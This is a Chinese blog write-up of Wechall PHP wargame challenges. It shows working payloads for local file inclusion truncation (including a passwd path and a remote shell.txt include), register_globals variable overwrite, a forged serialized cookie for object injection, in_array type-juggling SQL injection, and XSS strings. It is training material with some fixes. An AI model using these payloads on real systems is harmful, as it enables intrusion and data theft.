+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<h1 id="wechallphpwriteup">Wechall PHP Writeup</h1>
+<p style="max-width:100%;height:auto;">（吐槽一下：Wechall的题解好难找啊。。。）
+有一些PHP的题目在MYSQL里面就已经做过了，所以这里题解就不再写了，想看的可以去看看我写的Mysql的Writeup。<code style="max-width:100%;height:auto;">http://blog.csdn.net/qq_19876131/article/details/50594894</code></p>
+<p style="max-width:100%;height:auto;">Wechall PHP系列题目链接：<code style="max-width:100%;height:auto;">http://www.wechall.net/challs/PHP/by/chall_score/ASC/page-1</code></p>
+<h2 id="1trainingphplfi">1、Training: PHP LFI</h2>
+<p style="max-width:100%;height:auto;">一道本地文件包含题目，不用看源代码，主要代码它已经贴出来了：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">$filename = &amp;apos;pages/&amp;apos;.(isset($_GET["file"])?$_GET["file"]:"welcome").&amp;apos;.html&amp;apos;;
+include $filename;
+</code></pre>
+<p style="max-width:100%;height:auto;">一道有限制的本地文件包含，直接考虑%00截断，它有提示说是要访问一个../solution.php，所以开始直接尝试</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">?file=../solution.php%00
+</code></pre>
+<p style="max-width:100%;height:auto;">结果却是如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160319002156661" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">没有这个文件，那么在往上一级访问，如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">?file=../../solution.php%00
+</code></pre>
+<p style="max-width:100%;height:auto;">成功！</p>
+<p style="max-width:100%;height:auto;">这里简单贴一下自己总结的几种文件包含的绕过：具体的以后再写个博客吧，贴个比较详细链接：http://drops.wooyun.org/tips/3827（这篇文章刚开始挺详细的，越往后越简略。。。）</p>
+<h3 id="2100magic_quote_gpcoff">2.1 %00 截断（Magic<em>quote</em>gpc为off的情况下）</h3>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://127.0.0.1/include.php?dir=shell.txt%00
+</code></pre>
+<h3 id="22">2.2 使用？截断（用于远程文件包含）</h3>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">http://127.0.0.1/include.php?dir=http://127.0.0.1/shell.txt?
+http://127.0.0.1/include.php?dir=http://127.0.0.1/shell.txt%23
+</code></pre>
+<h3 id="23">2.3 通过使路径长度达到一定长度限制时截断(均适用)</h3>
+<p style="max-width:100%;height:auto;">通常Windows的截断长度为240，Linux的截断长度为4096。由于Windows和Linux的文件名都有一个最大路径长度(MAX_PATH)的限制，因此当提交文件名的长度超过了最大路劲长度限制是就会截断后面的内容，从而达到文件包含的效果。</p>
+<h3 id="24magic_quote_gpcoffwindowns">2.4 点号截断（当magic<em>quote</em>gpc为off的时候，仅限windowns服务器）</h3>
+<p style="max-width:100%;height:auto;">例子：http://127.0.0.1/include.php?dir=../../../../ect/passwd……………………………………………………………………[很多的.]</p>
+<h2 id="2php0817">2、PHP 0817</h2>
+<p style="max-width:100%;height:auto;">这道题源码先贴一下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+if (isset($_GET[&amp;apos;which&amp;apos;]))
+{
+        $which = $_GET[&amp;apos;which&amp;apos;];
+        switch ($which)        {
+        case 0:
+        case 1:
+        case 2:
+                require_once $which.&amp;apos;.php&amp;apos;;                break;
+        default:
+                echo GWF_HTML::error(&amp;apos;PHP-0817&amp;apos;, &amp;apos;Hacker NoNoNo!&amp;apos;, false);
+                break;
+        }}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">观察一下，发现case0,1都没有给出来，而且也没有别的多余的过滤，它要求的是访问<code style="max-width:100%;height:auto;">solution.php</code>看看源码，好像直接参数值赋为solution就行了，所以尝试</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">?which=solution
+</code></pre>
+<p style="max-width:100%;height:auto;">果然直接就成功了。。。</p>
+<h2 id="3trainingregisterglobals">3、Training: Register Globals</h2>
+<p style="max-width:100%;height:auto;">好把这道题犯蠢了，刚开始完全没有看到题目的提示是Register Globals的提示，一开始就盯着源码中的这一块儿一直琢磨：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if (isset($_POST[&amp;apos;password&amp;apos;]) &amp;&amp; isset($_POST[&amp;apos;username&amp;apos;]) &amp;&amp; is_string($_POST[&amp;apos;password&amp;apos;]) &amp;&amp; is_string($_POST[&amp;apos;username&amp;apos;]) )
+{
+    $uname = mysql_real_escape_string($_POST[&amp;apos;username&amp;apos;]);
+    $pass = md5($_POST[&amp;apos;password&amp;apos;]);
+    $query = "SELECT level FROM ".GWF_TABLE_PREFIX."wc_chall_reg_glob WHERE username=&amp;apos;$uname&amp;apos; AND password=&amp;apos;$pass&amp;apos;";
+    $db = gdo_db();
+    if (false === ($row = $db-&gt;queryFirst($query))) {
+        echo GWF_HTML::error(&amp;apos;Register Globals&amp;apos;, $chall-&gt;lang(&amp;apos;err_failed&amp;apos;));
+    } else {
+        # Login success
+        $login = array($_POST[&amp;apos;username&amp;apos;], (int)$row[&amp;apos;level&amp;apos;]);
+    }
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">虽然是<code style="max-width:100%;height:auto;">mysql_real_escape_string()</code>函数，但是数据库没有说是GBK编码的，经过实测，宽字符注入确实不管用，然后我就开始琢磨半天，后来才看到源码上面有这样一句：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;"># EMULATE REGISTER GLOBALS = ON
+foreach ($_GET as $k =&gt; $v) { $$k = $v; }
+</code></pre>
+<p style="max-width:100%;height:auto;">很明显的就是一个变量覆盖的问题，因为这里表明了我们通过get方式传入的参数都会直接被注册成全局变量。
+再看看源码最后的判断部分</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if (isset($login))
+{
+    echo GWF_HTML::message(&amp;apos;Register Globals&amp;apos;, $chall-&gt;lang(&amp;apos;msg_welcome_back&amp;apos;, array(htmlspecialchars($login[0]), htmlspecialchars($login[1]))));
+    if (strtolower($login[0]) === &amp;apos;admin&amp;apos;) {
+        $chall-&gt;onChallengeSolved(GWF_Session::getUserID());
+    }
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">问题就简单了，直接覆盖<code style="max-width:100%;height:auto;">$login[0]</code>就可以，</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160319002219802" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">注意要是用户名和密码不匹配就行了（就是随便乱输），这样子这道题就算搞定了！</p>
+<h2 id="areyouserial">Are you serial</h2>
+<p style="max-width:100%;height:auto;">这道题也是够折腾，刚开始不知道他要我干啥，给了6个源码，以及一个登录的地方</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160319002230474" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">随便试一下，输入一个serial，结果返回了一个这个东西：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160319002251224" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">开始看源码：
+<code style="max-width:100%;height:auto;">code.php</code>，几个判断，重要的如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if (isset($_POST[&amp;apos;login&amp;apos;]))
+{
+        $form-&gt;execute(Common::getPostString(&amp;apos;username&amp;apos;));
+}
+# Logout all the users
+elseif (isset($_POST[&amp;apos;logout&amp;apos;]))
+{
+        $form_logout-&gt;execute();
+}
+ ### Display
+
+..........中间我就省略了，节约空间
+
+# Logged in user
+if (false !== ($user = unserialize(Common::getCookie(&amp;apos;serial_user&amp;apos;, &amp;apos;&amp;apos;))))
+{
+        # Show welcome screen
+        echo GWF_HTML::message(&amp;apos;Serial Challenger&amp;apos;, $chall-&gt;lang(&amp;apos;msg_wb&amp;apos;, array(htmlspecialchars($user-&gt;getUsername()), $user-&gt;getPassword(), $user-&gt;getUserlevel())));
+                # Show logout form
+        echo $form_logout-&gt;serial_formz()-&gt;templateY($chall-&gt;lang(&amp;apos;ft_logout&amp;apos;));
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">看如果传参有login，那么就调用<code style="max-width:100%;height:auto;">SERIAL_LoginForm</code>类的一个方法，这样子最后userlevel必然就是0，因为最后一个类默认的userlevel值0，那么我们就不能让它正常login，然后发现下面有一个if语句是从cookie中读取<code style="max-width:100%;height:auto;">serial_user</code>,并且看到了关键的一个函数，<code style="max-width:100%;height:auto;">unserialize()</code>方法。</p>
+<blockquote>
+<p style="max-width:100%;height:auto;">PS：对于PHP object injection不太熟的可以看看我的另一篇博客专门介绍这个的。
+  http://blog.csdn.net/qq_19876131/article/details/50926210</p>
+</blockquote>
+<p style="max-width:100%;height:auto;">然后来看看这个<code style="max-width:100%;height:auto;">insecure.inc.php</code>源码，</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function my_autoloader($classname)
+{
+        chdir(&amp;apos;challenge/are_you_serial&amp;apos;);
+        require_once &amp;apos;./&amp;apos;.str_replace(&amp;apos;.&amp;apos;, &amp;apos;&amp;apos;, $classname).&amp;apos;.php&amp;apos;;        chdir(&amp;apos;../../&amp;apos;);
+}
+spl_autoload_register(&amp;apos;my_autoloader&amp;apos;);
+</code></pre>
+<p style="max-width:100%;height:auto;">这题的重点就在于 <code style="max-width:100%;height:auto;">spl_autoload_register</code> 这个函数，解序列化后的如果有类, 而且当前程序中未定义该类, 则会自动把该类的名称传值到<code style="max-width:100%;height:auto;">( sql_autoload_register(xxx) ) xxx</code>函数中，这里是要访问<code style="max-width:100%;height:auto;">SERIAL_Solution.php</code>就算成功了。
+即我们的类名一定要是<code style="max-width:100%;height:auto;">SERIAL_Solution</code>，即反序列化之后传入<code style="max-width:100%;height:auto;">my_autoloader</code>函数中的参数才会是SERIAL_Solution，这样才能访问<code style="max-width:100%;height:auto;">SERIAL_Solution.php</code>，所以问题就简单了，
+根据下述代码产生的payload，</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+final class SERIAL_Solution
+{
+        public $username = &amp;apos;&amp;apos;;
+        public $password = &amp;apos;&amp;apos;;        
+        public $userlevel = 0;
+}
+$a = new SERIAL_Solution();
+$a-&gt;username=&amp;apos;serial&amp;apos;;
+$a-&gt;password=&amp;apos;testtest&amp;apos;;
+$a-&gt;userlevel=100;
+
+echo serialize($a);
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">输出为：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">O:15:"SERIAL_Solution":3:{s:8:"username";s:6:"serial";s:8:"password";s:8:"testtest";s:9:"userlevel";i:100;}
+</code></pre>
+<p style="max-width:100%;height:auto;">根据最开始的分析，我们要修改cookie使得，<code style="max-width:100%;height:auto;">serial_user</code>的值为上述值的URL编码并且把参数中的<code style="max-width:100%;height:auto;">login</code>删掉，这样就算注入成功了。
+抓包并修改的截图如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160319002320256" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">然后就成功了：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160319002329943" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">这道题好吧这道题花了我好久好久才搞出来，还是太菜了，要是有Writeup就不会这样了，所以我才打算写个WP，方便自己也方便别人吧。</p>
+<h2 id="php0819">PHP 0819</h2>
+<p style="max-width:100%;height:auto;">好吧，这道题是问了别人的，涨姿势了，第一次知道php还有这鬼东西….<code style="max-width:100%;height:auto;">heredoc</code>
+简单介绍下<code style="max-width:100%;height:auto;">heredoc</code>吧，这里先贴个链接http://www.cnblogs.com/igoogleyou/p/heredoc.html</p>
+<p style="max-width:100%;height:auto;">php 中的 heredoc技术是php用来引用字符串的一种方式。在phpwind中巧妙的运用了这个技术，实现了逻辑代码和界面设计的分离。
+语法：  </p>
+<ol>
+<li>使用操作符  “&lt;&lt;&lt;”</li>
+<li>操作符后紧跟标识符（开始标识符），之后重起新的一行 输入要引用的字符串，可以包含变量。</li>
+<li>新的一行，顶格写结束表示符，以分号结束。
+例如</li>
+</ol>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+
+$str = &lt;&lt;&lt;s
+heredoc!
+s;
+
+echo $str;
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">在上述例子中，<code style="max-width:100%;height:auto;">$str</code>的值就是heredoc，即我的标志符就是<code style="max-width:100%;height:auto;">s</code>。</p>
+<p style="max-width:100%;height:auto;">那么这里就简单了，我只需要让eval为1337就行了，构造payload如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">?eval=&lt;&lt;&lt;s%0a1337%0as;%0a
+</code></pre>
+<p style="max-width:100%;height:auto;">这里注意最后的换行符，因为我们使用的这个<code style="max-width:100%;height:auto;">heredoc</code>，加上eval，那么一定要在最后加上换行符，这里卡了我好久好久。。。卡的我连妈都不认识了。。。。。</p>
+<h2 id="hostme">HOST me</h2>
+<p style="max-width:100%;height:auto;">这道题给出的代码很简单，<code style="max-width:100%;height:auto;">·$_SERVER[&amp;apos;HTTP_HOST&amp;apos;]</code> 是从http头的Host读的，所以很明显是要改<code style="max-width:100%;height:auto;">http header</code>的，用<code style="max-width:100%;height:auto;">burp suite</code>抓包吧，然后把HOST改成<code style="max-width:100%;height:auto;">localhost</code></p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160321210102147" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">好吧，果然没有这么简单</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160321210119162" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">看到了一个wrong vhost，这个就蛋疼了，第一次还是在很早之前的，当时完全不知道怎么搞，后来之前简单学习过配置litespeed的虚拟主机才有了些基本的印象。
+这里它说wrong vhost，错误的虚拟主机，那么很有可能就是他这台虚拟主机的名称也叫<code style="max-width:100%;height:auto;">localhost</code>，因为请求头的<code style="max-width:100%;height:auto;">HOST</code>参数已经被改成了<code style="max-width:100%;height:auto;">localhost</code>，然后当我们访问的时候就访问到这台机器上去了，而不是我们题目的机器，而这时候也不用想别的，直接把GET上的URL补全就行了，补全成</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">GET www.wechall.net/challenge/space/host_me/index.php HTTP/1.1
+Host: localhost
+.......//其他的请求头参数,不罗列了
+</code></pre>
+<p style="max-width:100%;height:auto;">这样子就成功了，还有，一定要下拉一下页面才能够看到成功的信息，当时没看到成功，又浪费了大把时间。。。报警了。。</p>
+<h2 id="php0815">PHP 0815</h2>
+<p style="max-width:100%;height:auto;">这道题感觉怪怪的。。。
+先贴源码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?
+# Only allow these ID&amp;apos;s
+$whitelist = array(1, 2, 3);
+
+# if show is not set die with error.if (false === ($show = isset($_GET[&amp;apos;show&amp;apos;]) ? $_GET[&amp;apos;show&amp;apos;] : false)) {
+        die(&amp;apos;MISSING PARAMETER; USE foo.bar?show=[1-3]&amp;apos;);
+}
+# check if get var is sane (is it in whitelist ?)
+elseif (in_array($show, $whitelist)){
+        $query = "SELECT 1 FROM `table` WHERE `id`=$show";
+        echo &amp;apos;Query: &amp;apos;.htmlspecialchars($query, ENT_QUOTES).&amp;apos;&lt;br/&gt;&amp;apos;;
+        die(&amp;apos;SHOWING NUMBER &amp;apos;.htmlspecialchars($show, ENT_QUOTES));
+}else # Not in whitelist !
+{
+        die(&amp;apos;HACKER NONONO&amp;apos;);
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">说是这里可能存在SQL注入，找一下修复方法，一脸懵逼好吧。修复方法我要杂提交啊？
+先看看把，这里问题关键在于这个部分</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">elseif (in_array($show, $whitelist)){
+    ......
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">这个<code style="max-width:100%;height:auto;">in_array()</code>函数和我们的<code style="max-width:100%;height:auto;">intval()</code>之类的一样，就拿这里来说吧。
+我们举个例子，看看下面的代码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+$whitelist = array(1, 2, 3);
+$show =&amp;apos;2 or 1=1#&amp;apos;;
+if (in_array($show, $whitelist)){
+    echo "success!";
+}
+else{
+    echo "hack failed!";
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">输入结果是<code style="max-width:100%;height:auto;">success!</code>，所以SQL注入漏洞就在这里，他要的是1到3的数，我们可以直接加上一个强制类型转换就行了啊，比如判断的时候加上一个<code style="max-width:100%;height:auto;">intval()</code>函数，对输入进行强制类型转换成整形就避免了这个漏洞。
+然后我该怎么提交答案。。。。
+我交了一个<code style="max-width:100%;height:auto;">intval()</code>
+结果网站返回了这个：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160321210223244" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">一脸懵逼好吧，还能更短些。。。。。
+后来想到了试试<code style="max-width:100%;height:auto;">(int)</code>，结果又得到了这个：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160321210249476" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">日了狗了，它说结果就两个字母，哎，懵逼了，想不动了。。。
+要是哪位大神知道正确答案，求指教。。</p>
+<h2 id="php0818">PHP 0818</h2>
+<p style="max-width:100%;height:auto;">拿到源码，贴一下主要的函数：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function noother_says_correct($number)
+{
+    $one = ord(&amp;apos;1&amp;apos;);
+    $nine = ord(&amp;apos;9&amp;apos;);
+    # Check all the input characters!
+    for ($i = 0; $i &lt; strlen($number); $i++)
+    {
+        # Disallow all the digits!
+        $digit = ord($number{$i});
+        if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
+        {
+            # Aha, digit not allowed!
+            return false;
+        }
+    }
+
+    # Allow the magic number ...
+    return $number == "3735929054";
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">这道题直接16进制就行了，3735929054的16进制是<code style="max-width:100%;height:auto;">0xdeadc0de</code>,直接提交就行了。</p>
+<h2 id="htmlspecialchars">htmlspecialchars</h2>
+<p style="max-width:100%;height:auto;">这是一道XSS题目，题目吹了一长串逼，然后让你找出漏洞在哪儿然后提交一个解决方案，
+过滤如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">echo "&lt;a href=&amp;apos;http://".htmlspecialchars(Common::getPost(&amp;apos;input&amp;apos;))."&amp;apos;&gt;Exploit Me&lt;/a&gt;";
+</code></pre>
+<p style="max-width:100%;height:auto;">测试的总感觉他的环境好像有点问题，不稳定，本地简单搭一个。如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+if(isset($_GET[&amp;apos;in&amp;apos;]))
+{
+    $a=$_GET[&amp;apos;in&amp;apos;];
+    echo "&lt;a href=&amp;apos;http://".htmlspecialchars($a)."&amp;apos;&gt;Exploit Me&lt;/a&gt;";
+    echo htmlspecialchars("&lt;a href=&amp;apos;http://".htmlspecialchars($a)."&amp;apos;&gt;Exploit Me&lt;/a&gt;");
+}
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">这个其实比较简单，因为单纯的htmlspecialchars()不加参数只会将双引号实体化，这里只需要单引号即可，例如下述代码就可以，</p>
+<pre><code style="max-width:100%;height:auto;">&amp;apos; onmouseover= &amp;apos;alert(1)
+</code></pre>
+<p style="max-width:100%;height:auto;">所以问题就在于单引号没有被过滤，那么修改方案也简单，
+http://www.w3school.com.cn/php/func<em>string</em>htmlspecialchars.asp
+这一页有详细的介绍：</p>
+<pre><code style="max-width:100%;height:auto;">ENT_COMPAT - 默认。仅编码双引号。
+ENT_QUOTES - 编码双引号和单引号。
+ENT_NOQUOTES - 不编码任何引号。
+</code></pre>
+<p style="max-width:100%;height:auto;">所以我们只需要在其中加入参数即可，所以最后答案就是：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">echo "&lt;a href=&amp;apos;http://".htmlspecialchars(Common::getPost(&amp;apos;input&amp;apos;),ENT_QUOTES)."&amp;apos;&gt;Exploit Me&lt;/a&gt;";
+</code></pre>
+<h2 id="php0816">PHP 0816</h2>
+<p style="max-width:100%;height:auto;">直接贴看主要代码把：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">foreach ($_GET as $key =&gt; $value){
+        if ($key === &amp;apos;src&amp;apos;) {
+                    php0816SetSourceFile($value);
+        }
+        elseif ($key === &amp;apos;mode&amp;apos;) {                
+                php0816execute($value);
+        }
+        elseif ($key === &amp;apos;hl&amp;apos;) {
+                php0816addHighlights($value);
+        }}
+</code></pre>
+<p style="max-width:100%;height:auto;">他给了几个样例网页说明了这个功能，主要就是几个参数，<code style="max-width:100%;height:auto;">src</code>，<code style="max-width:100%;height:auto;">hl</code>，<code style="max-width:100%;height:auto;">mode</code>，然后就是上述代码，它是按顺序读取参数值的，</p>
+<ul>
+<li><code style="max-width:100%;height:auto;">php0816SetSourceFile</code>主要是设置显示源码的文件名，有一个白名单过滤，它会读取<code style="max-width:100%;height:auto;">src</code>，</li>
+<li>然后是<code style="max-width:100%;height:auto;">php0816execute</code>高亮显示的执行程序，这里它要求是<code style="max-width:100%;height:auto;">hl</code>参数不为空，</li>
+<li>然后就是<code style="max-width:100%;height:auto;">php0816addHighlights</code>，问题就在这里，我们看看这个函数漏洞部分的源码</li>
+</ul>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function php0816Highlighter(){
+        ......
+        ......
+        $filename = str_replace(array(&amp;apos;/&amp;apos;, &amp;apos;\\&amp;apos;, &amp;apos;..&amp;apos;), &amp;apos;&amp;apos;, Common::getGet(&amp;apos;src&amp;apos;));#        
+        ......
+        ......
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">这里又一次从GET参数里面获取src的值，而之前那个<code style="max-width:100%;height:auto;">php0816SetSourceFile</code>也是这样获取然后进行过滤，根据最开始对GET参数的顺序的读取，那么我们只需要先让它进入到<code style="max-width:100%;height:auto;">php0816Highlighter</code>这里就直接获取<code style="max-width:100%;height:auto;">src</code>而不会被<code style="max-width:100%;height:auto;">php0816SetSourceFile</code>所过滤了。so，简单说就是改一下参数顺序就可以，payload如下：</p>
+<pre><code class="vbscript-html language-vbscript-html" style="max-width:100%;height:auto;">http://www.wechall.net/challenge/php0816/code.php?hl[0]=123&amp;mode=hl&amp;src=solution.php
+</code></pre>
+<p style="max-width:100%;height:auto;">然后我们就拿到了Answer如下图</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Wechall-PHP-Writeup/20160321210314679" style="max-width:100%;height:auto;"/><br/></p>
+<blockquote>
+<p style="max-width:100%;height:auto;">答案就是AnotherCodeflowMistake</p>
+</blockquote>
+<h2 id="yourselfphp">Yourself PHP</h2>
+<p style="max-width:100%;height:auto;">一道XSS的题目，先贴源码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">..........
+if (isset($_POST[&amp;apos;username&amp;apos;])){
+        echo GWF_Box::box(sprintf("Well done %s, you entered your username. But this is &lt;b&gt;not&lt;/b&gt; what you need to do.", htmlspecialchars(Common::getPostString(&amp;apos;username&amp;apos;))));
+}
+..........
+echo sprintf(&amp;apos;&lt;form action="%s" method="post"&gt;&amp;apos;, $_SERVER[&amp;apos;PHP_SELF&amp;apos;]).PHP_EOL;
+..........
+</code></pre>
+<p style="max-width:100%;height:auto;">这里折腾了一会儿<code style="max-width:100%;height:auto;">username</code>的输入，后来确实是认为那个是XSS不进去的，然后再看看代码，看到了一个比较关键的东西，<code style="max-width:100%;height:auto;">$_SERVER[&amp;apos;PHP_SELF&amp;apos;]</code>，好的，XSS点就在这里了。
+<code style="max-width:100%;height:auto;">$_SERVER[&amp;apos;PHP_SELF&amp;apos;]</code>表示当前执行脚本的文件名，比如下述代码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+echo $_SERVER[&amp;apos;PHP_SELF&amp;apos;];
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">我把它放在<code style="max-width:100%;height:auto;">127.0.0.1/index.php</code>下面，那么输入结果就是</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">/index.php
+</code></pre>
+<p style="max-width:100%;height:auto;">这个东西常常用于表单提交给本页面。
+这里我们直接在URL后面附上XSS代码，网站用<code style="max-width:100%;height:auto;">$_SERVER[&amp;apos;PHP_SELF&amp;apos;]</code>直接放进了form标签，那我们可以构造payload如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">https://www.wechall.net/challenge/yourself_php/index.php/"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">先封闭之前的form标签在自己构建一个新的标签造成XSS。</p>
+<h2 id="crappyshare">Crappyshare</h2>
+<p style="max-width:100%;height:auto;">同样是一道本地文件包含的题目，因为在URL上传时除了简单的正则匹配时并没有别的过滤，要读取本地的<code style="max-width:100%;height:auto;">solution.php</code>文件，那么我们可以这样构造</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">file://solution.php
+</code></pre>
+<p style="max-width:100%;height:auto;">直接将上述语句输入到URL框即可。意思就是打印本地的solution.php文件。
+别的就不多说了。</p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="./Wechall-PHP-Writeup/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./Wechall-PHP-Writeup/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="./Wechall-PHP-Writeup/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./Wechall-PHP-Writeup/prism.js"></script>
+<script src="./Wechall-PHP-Writeup/zooming.js"></script>
+<script src="./Wechall-PHP-Writeup/Bendawang.js"></script>
+
+
